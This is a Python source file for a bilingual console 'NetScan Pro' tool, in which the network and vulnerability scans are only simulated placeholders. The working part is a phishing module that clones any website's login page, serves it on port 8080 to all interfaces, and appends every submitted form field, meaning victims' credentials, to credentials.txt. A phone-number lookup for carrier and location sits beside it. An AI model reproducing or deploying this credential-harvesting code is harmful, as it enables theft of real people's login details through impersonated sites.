import os
import subprocess
import http.server
import socketserver
import threading
import time
import webbrowser
import requests
from bs4 import BeautifulSoup
from colorama import init, Fore, Style
import phonenumbers
from phonenumbers import geocoder, carrier
import urllib.parse

# Função para limpar a tela do console
def clear_console():
    """Clears the console screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

# Função para exibir a mensagem de boas-vindas
def welcome_message(language):
    clear_console()
    if language == '1':
        print(Fore.GREEN + Style.BRIGHT + "Welcome to the NetScan Pro tool!".center(50))
    else:
        print(Fore.GREEN + Style.BRIGHT + "Bem-vindo à ferramenta NetScan Pro!".center(50))
    print()
    time.sleep(2)
    clear_console()

# Função para exibir a mensagem de despedida
def goodbye_message(language):
    clear_console()
    if language == '1':
        print(Fore.GREEN + Style.BRIGHT + "Thank you for using NetScan Pro tool!".center(50))
    else:
        print(Fore.GREEN + Style.BRIGHT + "Obrigado por usar a ferramenta NetScan Pro!".center(50))
    time.sleep(3)
    print()

# Função para lidar com opções inválidas
def handle_invalid_option(language):
    clear_console()
    if language == '1':
        print(Fore.RED + "Invalid option. Please choose again.")
    else:
        print(Fore.RED + "Opção inválida. Por favor, escolha novamente.")
    time.sleep(2)

# Função para exibir a mensagem de carregamento
def loading_screen():
    print("Loading...")
    time.sleep(3)
    clear_console()
    print(Style.BRIGHT + "@wbrunnno".center(100))
    time.sleep(1)

# Função para atualizar a ferramenta do GitHub
def update_tool_from_github(language):
    clear_console()
    print(Fore.YELLOW + Style.BRIGHT + "Updating NetScan Pro tool from GitHub...")

    try:
        # Atualização usando Git
        subprocess.run(["git", "pull", "https://github.com/WeverttonBruno/NetScanPro.git"])
        print("NetScan Pro tool has been updated successfully!")

        # Reiniciando a ferramenta após a atualização
        print("Restarting NetScan Pro tool...")
        time.sleep(2)
        clear_console()
        print("NetScan Pro tool has been updated and restarted.")

        time.sleep(2)
    except Exception as e:
        print(Fore.RED + f"Error updating the tool: {e}")

    # Retorna ao menu principal após a atualização
    time.sleep(3)
    main_menu(language)

# Função para exibir o menu principal
def main_menu(language):
    while True:
        clear_console()
        if language == '1':
            print(Fore.YELLOW + Style.BRIGHT + " Main Menu ".center(50, '-'))
            print("1. Network Tools")
            print("2. Social Engineering Tools")
            print("3. Update Tool")
            print("0. Exit")
        else:
            print(Fore.YELLOW + Style.BRIGHT + " Menu Principal ".center(50, '-'))
            print("1. Ferramentas de Rede")
            print("2. Ferramentas de Engenharia Social")
            print("3. Atualizar Ferramenta")
            print("0. Sair")

        choice = input("Choose an option: ")

        if choice == '0':
            goodbye_message(language)
            break
        elif choice == '1':
            network_tools_menu(language)
        elif choice == '2':
            social_engineering_tools(language)
        elif choice == '3':
            update_tool_from_github(language)
        else:
            handle_invalid_option(language)

# Função para o menu de ferramentas de rede
def network_tools_menu(language):
    while True:
        clear_console()
        if language == '1':
            print(Fore.YELLOW + Style.BRIGHT + " Network Tools ".center(50, '-'))
            print("1. Scan a Network")
            print("2. Scan Own Network")
            print("3. Vulnerability Scanning")
            print("0. Back to Main Menu")
        else:
            print(Fore.YELLOW + Style.BRIGHT + " Ferramentas de Rede ".center(50, '-'))
            print("1. Escanear uma Rede")
            print("2. Escanear a Própria Rede")
            print("3. Escaneamento de Vulnerabilidades")
            print("0. Voltar ao Menu Principal")

        choice = input("Choose an option: ")

        if choice == '0':
            return
        elif choice == '1':
            enter_network(language)
            manual_mode(language)
        elif choice == '2':
            scan_own_network(language)
        elif choice == '3':
            vulnerability_scan_mode(language)
        else:
            handle_invalid_option(language)

# Função para entrar com o nome da rede
def enter_network(language):
    clear_console()
    if language == '1':
        return input("Enter the network name: ")
    else:
        return input("Digite o nome da rede: ")

# Função para o modo manual
def manual_mode(language):
    clear_console()
    if language == '1':
        print("Scanning network in manual mode...")
    else:
        print("Escanenado rede no modo manual...")

    # Lógica para o modo manual (simulado)
    time.sleep(3)
    input("Press Enter to continue...")

# Função para escanear a própria rede
def scan_own_network(language):
    clear_console()
    if language == '1':
        print("Scanning own network...")
    else:
        print("Escanenando a própria rede...")

    # Lógica para escanear a própria rede (simulado)
    time.sleep(3)
    input("Press Enter to continue...")

# Função para o escaneamento de vulnerabilidades
def vulnerability_scan_mode(language):
    clear_console()
    if language == '1':
        print("Vulnerability scanning...")
    else:
        print("Escaneamento de vulnerabilidades...")

    # Lógica para o escaneamento de vulnerabilidades (simulado)
    time.sleep(3)
    input("Press Enter to continue...")

# Função para o menu de ferramentas de engenharia social
def social_engineering_tools(language):
    while True:
        clear_console()
        if language == '1':
            print(Fore.YELLOW + Style.BRIGHT + " Social Engineering Tools ".center(50, '-'))
            print("1. Phone Number Information")
            print("2. Phishing")
            print("0. Back to Main Menu")
        else:
            print(Fore.YELLOW + Style.BRIGHT + " Ferramentas de Engenharia Social ".center(50, '-'))
            print("1. Informações de Número de Telefone")
            print("2. Phishing")
            print("0. Voltar ao Menu Principal")

        choice = input("Choose an option: ")

        if choice == '0':
            return
        elif choice == '1':
            phone_number_info(language)
        elif choice == '2':
            phishing_menu(language)
        else:
            handle_invalid_option(language)

# Função para o submenu de phishing
def phishing_menu(language):
    while True:
        clear_console()
        if language == '1':
            print(Fore.YELLOW + Style.BRIGHT + " Phishing Menu ".center(50, '-'))
            print("1. Fake Login Pages")
            print("0. Back to Social Engineering Tools")
        else:
            print(Fore.YELLOW + Style.BRIGHT + " Menu de Phishing ".center(50, '-'))
            print("1. Páginas de Logins Falsas")
            print("0. Voltar para Ferramentas de Engenharia Social")

        choice = input("Choose an option: ")

        if choice == '0':
            return
        elif choice == '1':
            fake_login_pages(language)
        else:
            handle_invalid_option(language)

# Função para as páginas de logins falsas
def fake_login_pages(language):
    clear_console()
    if language == '1':
        print("Enter the URL of the website to clone for fake login:")
    else:
        print("Digite a URL do site para clonar para login falso:")

    url = input("URL: ")

    # Selecionar o servidor (apenas localhost implementado)
    server_choice = '1'

    clone_website(url, server_choice, language)

# Função para clonar um site para login falso
def clone_website(url, server_choice, language):
    clear_console()
    if language == '1':
        print(f"Cloning {url} for fake login...")
    else:
        print(f"Clonando {url} para login falso...")

    try:
        # Fazendo requisição GET para obter o conteúdo da página
        response = requests.get(url)
        if response.status_code == 200:
            # Parseando o conteúdo com BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')

            # Salvando o HTML e CSS
            html_content = soup.prettify()
            css_content = ""
            for css in soup.find_all('link', rel='stylesheet'):
                css_url = css['href']
                css_response = requests.get(css_url)
                css_content += css_response.text

            with open('index.html', 'w', encoding='utf-8') as html_file:
                html_file.write(html_content)
            with open('style.css', 'w', encoding='utf-8') as css_file:
                css_file.write(css_content)

            if server_choice == '1':
                run_localhost_server(language)
            else:
                if language == '1':
                    print("Server choice not implemented yet.")
                else:
                    print("Escolha de servidor ainda não implementada.")
        else:
            if language == '1':
                print(f"Failed to clone {url}. HTTP Status Code: {response.status_code}")
            else:
                print(f"Falha ao clonar {url}. Código de Status HTTP: {response.status_code}")

    except Exception as e:
        if language == '1':
            print(f"Error cloning website: {e}")
        else:
            print(f"Erro ao clonar o site: {e}")

    input("Press Enter to continue...")

# Função para rodar um servidor HTTP local para phishing
def run_localhost_server(language):
    clear_console()
    if language == '1':
        print("Executing phishing site on localhost...")
        print("Server running at http://localhost:8080")
    else:
        print("Executando site de phishing em localhost...")
        print("Servidor rodando em http://localhost:8080")

    # Classe personalizada para lidar com requisições HTTP POST
    class PhishingServer(http.server.SimpleHTTPRequestHandler):
        def do_POST(self):
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            post_params = urllib.parse.parse_qs(post_data)

            with open('credentials.txt', 'a') as cred_file:
                cred_file.write(str(post_params) + '\n')

            # Redireciona para a página falsa novamente
            self.send_response(301)
            self.send_header('Location', '/')
            self.end_headers()

    # Inicia o servidor HTTP em uma nova thread
    server = socketserver.TCPServer(('0.0.0.0', 8080), PhishingServer)
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()

    # Abre o navegador para mostrar o site de phishing
    webbrowser.open('http://localhost:8080')

    # Mantém o servidor rodando até que o usuário decida parar
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        server.shutdown()
        if language == '1':
            print("Phishing server stopped.")
        else:
            print("Servidor de phishing parado.")

# Função para obter informações de número de telefone
def phone_number_info(language):
    clear_console()
    if language == '1':
        print("Enter the phone number (with country code):")
    else:
        print("Digite o número de telefone (com código do país):")

    phone_number = input("Phone Number: ")

    try:
        parsed_number = phonenumbers.parse(phone_number)
        if phonenumbers.is_valid_number(parsed_number):
            local_number = phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.NATIONAL)
            international_number = phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
            country_prefix = parsed_number.country_code
            country_code = geocoder.country_name_for_number(parsed_number, 'en')
            location = geocoder.description_for_number(parsed_number, 'en')
            carrier_name = carrier.name_for_number(parsed_number, 'en')
            line_type = phonenumbers.number_type(parsed_number)

            phone_info = {
                "valid": True,
                "number": phone_number,
                "local_format": local_number,
                "international_format": international_number,
                "country_prefix": country_prefix,
                "country_code": country_code,
                "country_name": country_code,
                "location": location,
                "carrier": carrier_name,
                "line_type": line_type
            }
        else:
            phone_info = {"valid": False}

        if language == '1':
            print(Fore.GREEN + "Phone Number Information:")
        else:
            print(Fore.GREEN + "Informações do Número de Telefone:")

        for key, value in phone_info.items():
            print(Fore.YELLOW + f"{key}: {value}")

    except Exception as e:
        if language == '1':
            print(Fore.RED + f"Error: {e}")
        else:
            print(Fore.RED + f"Erro: {e}")

    input("Press Enter to continue...")

if __name__ == "__main__":
    init(autoreset=True)
    language = input("Choose your language / Escolha seu idioma (1-English, 2-Português): ")
    welcome_message(language)
    loading_screen()
    main_menu(language)
